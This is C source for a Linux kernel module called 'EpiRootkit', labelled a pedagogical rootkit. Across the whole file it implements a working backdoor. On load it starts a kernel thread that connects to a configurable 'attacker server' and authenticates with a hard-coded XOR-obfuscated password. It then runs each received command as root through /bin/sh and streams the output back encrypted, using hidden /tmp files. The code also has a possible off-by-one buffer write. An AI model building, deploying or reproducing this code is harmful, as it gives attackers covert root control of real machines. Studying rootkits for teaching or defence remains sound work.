#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Team_Rodrien");
MODULE_DESCRIPTION("EpiRootkit - A pedagogical rootkit");
MODULE_VERSION("0.3");

#define XOR_KEY 0x2A
#define PASSWORD "secret"
#define PASSWORD_LEN 6
#define MAX_CMD_LEN 512
#define EOF_MARKER "--EOF--"
#define SEP_STDERR "--STDERR--"
#define SEP_STATUS "--STATUS--"

static struct socket *g_sock = NULL;
static struct task_struct *g_conn_thread = NULL;
static int connection_state = 0;

static char *server_ip = "192.168.15.6";
static int server_port = 4242;
module_param(server_ip, charp, 0400);
module_param(server_port, int, 0400);
MODULE_PARM_DESC(server_ip, "Attacker server IP address");
MODULE_PARM_DESC(server_port, "Attacker server port");

static void notify_connection_state(int new_state) {
    if (new_state != connection_state) {
        connection_state = new_state;
        if (connection_state)
            printk(KERN_INFO "epirootkit: Connected to C2 server\n");
        else
            printk(KERN_INFO "epirootkit: Disconnected from C2 server\n");
    }
}

static void xor_encrypt(char *buf, size_t len) {
    for (size_t i = 0; i < len; ++i)
        buf[i] ^= XOR_KEY;
}

static int recv_data(char *buf, size_t len) {
    struct kvec iov = {.iov_base = buf, .iov_len = len};
    struct msghdr msg = {0};
    return kernel_recvmsg(g_sock, &msg, &iov, 1, len, 0);
}

static int send_data(const char *buf, size_t len) {
    struct kvec iov = {.iov_base = (char *)buf, .iov_len = len};
    struct msghdr msg = {0};
    return kernel_sendmsg(g_sock, &msg, &iov, 1, len);
}

static void send_encrypted_section(const char *data) {
    size_t len = strlen(data);
    char *tmp = kmalloc(len + 1, GFP_KERNEL);
    if (!tmp) return;
    memcpy(tmp, data, len);
    xor_encrypt(tmp, len);
    send_data(tmp, len);
    kfree(tmp);
}

static int execute_and_stream_output(const char *cmd) {
    char tmp_stdout[] = "/tmp/.rk_stdout";
    char tmp_stderr[] = "/tmp/.rk_stderr";
    char tmp_status[] = "/tmp/.rk_status";

    char full_cmd[1024];
    snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2> %s; echo $? > %s", cmd, tmp_stdout, tmp_stderr, tmp_status);

    mm_segment_t old_fs = get_fs();
    set_fs(KERNEL_DS);
    call_usermodehelper("/bin/sh", (char *[]){"/bin/sh", "-c", full_cmd, NULL}, NULL, UMH_WAIT_PROC);
    set_fs(old_fs);

    struct file *f;
    loff_t pos = 0;
    char buf[256];

    pos = 0;
    f = filp_open(tmp_stdout, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        while (1) {
            memset(buf, 0, sizeof(buf));
            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
            if (r <= 0) break;
            buf[r] = '\0';
            send_encrypted_section(buf);
        }
        filp_close(f, NULL);
    }
    send_encrypted_section(SEP_STDERR);

    pos = 0;
    f = filp_open(tmp_stderr, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        while (1) {
            memset(buf, 0, sizeof(buf));
            int r = kernel_read(f, buf, sizeof(buf) - 1, &pos);
            if (r <= 0) break;
            buf[r] = '\0';
            send_encrypted_section(buf);
        }
        filp_close(f, NULL);
    }
    send_encrypted_section(SEP_STATUS);

    pos = 0;
    f = filp_open(tmp_status, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        memset(buf, 0, sizeof(buf));
        kernel_read(f, buf, sizeof(buf) - 1, &pos);
        buf[strcspn(buf, "\n")] = 0;
        send_encrypted_section(buf);
        filp_close(f, NULL);
    } else {
        // If we can't read the status file, send failure status
        send_encrypted_section("-1");
    }

    // Clean up temporary files
    set_fs(KERNEL_DS);
    call_usermodehelper("/bin/rm", (char *[]){"/bin/rm", "-f", tmp_stdout, tmp_stderr, tmp_status, NULL}, NULL, UMH_WAIT_PROC);
    set_fs(old_fs);

    send_encrypted_section(EOF_MARKER);
    return 0;
}

static int rootkit_thread_fn(void *data) {
    struct sockaddr_in server;

    while (!kthread_should_stop()) {
        if (sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &g_sock) < 0) {
            ssleep(5);
            continue;
        }

        memset(&server, 0, sizeof(server));
        server.sin_family = AF_INET;
        server.sin_port = htons(server_port);
        server.sin_addr.s_addr = in_aton(server_ip);

        if (g_sock->ops->connect(g_sock, (struct sockaddr *)&server, sizeof(server), 0) < 0) {
            sock_release(g_sock);
            g_sock = NULL;
            ssleep(5);
            continue;
        }

        notify_connection_state(1);

        char auth_buf[PASSWORD_LEN];
        if (recv_data(auth_buf, PASSWORD_LEN) != PASSWORD_LEN) {
            printk(KERN_WARNING "epirootkit: auth receive error\n");
            break;
        }

        xor_encrypt(auth_buf, PASSWORD_LEN);

        if (strncmp(auth_buf, PASSWORD, PASSWORD_LEN) != 0) {
            char fail[] = "FAIL";
            xor_encrypt(fail, sizeof(fail) - 1);
            send_data(fail, sizeof(fail) - 1);
            break;
        }

        char ok[] = "OK";
        xor_encrypt(ok, sizeof(ok) - 1);
        send_data(ok, sizeof(ok) - 1);

        char cmd_buf[MAX_CMD_LEN];
        while (!kthread_should_stop()) {
            memset(cmd_buf, 0, sizeof(cmd_buf));
            int len = recv_data(cmd_buf, MAX_CMD_LEN);
            if (len <= 0) break;

            xor_encrypt(cmd_buf, len);
            cmd_buf[len] = '\0';

            if (strcmp(cmd_buf, "exit") == 0 || strcmp(cmd_buf, "quit") == 0) break;
            if (strcmp(cmd_buf, "PING") == 0) {
                char pong[] = "PONG";
                xor_encrypt(pong, sizeof(pong) - 1);
                send_data(pong, sizeof(pong) - 1);
                continue;
            }
            if (strncmp(cmd_buf, "hide ", 5) == 0) {
                send_encrypted_section("[TODO] hide command acknowledged\n");
                send_encrypted_section(SEP_STDERR);
                send_encrypted_section(SEP_STATUS);
                send_encrypted_section("0");
                send_encrypted_section(EOF_MARKER);
                continue;
            }
            execute_and_stream_output(cmd_buf);
        }

        break;
    }

    if (g_sock) {
        kernel_sock_shutdown(g_sock, SHUT_RDWR);
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }

    return 0;
}

static int __init epirootkit_init(void) {
    pr_info("epirootkit: Initializing...\n");
    g_conn_thread = kthread_run(rootkit_thread_fn, NULL, "rk_conn");
    if (IS_ERR(g_conn_thread)) {
        pr_err("epirootkit: Failed to start connection thread\n");
        return PTR_ERR(g_conn_thread);
    }
    return 0;
}

static void __exit epirootkit_exit(void) {
    pr_info("epirootkit: Cleaning up module...\n");
    if (g_conn_thread) {
        kthread_stop(g_conn_thread);
        g_conn_thread = NULL;
    }
    if (g_sock) {
        kernel_sock_shutdown(g_sock, SHUT_RDWR);
        sock_release(g_sock);
        g_sock = NULL;
        notify_connection_state(0);
    }
    pr_info("epirootkit: Cleanup complete\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);
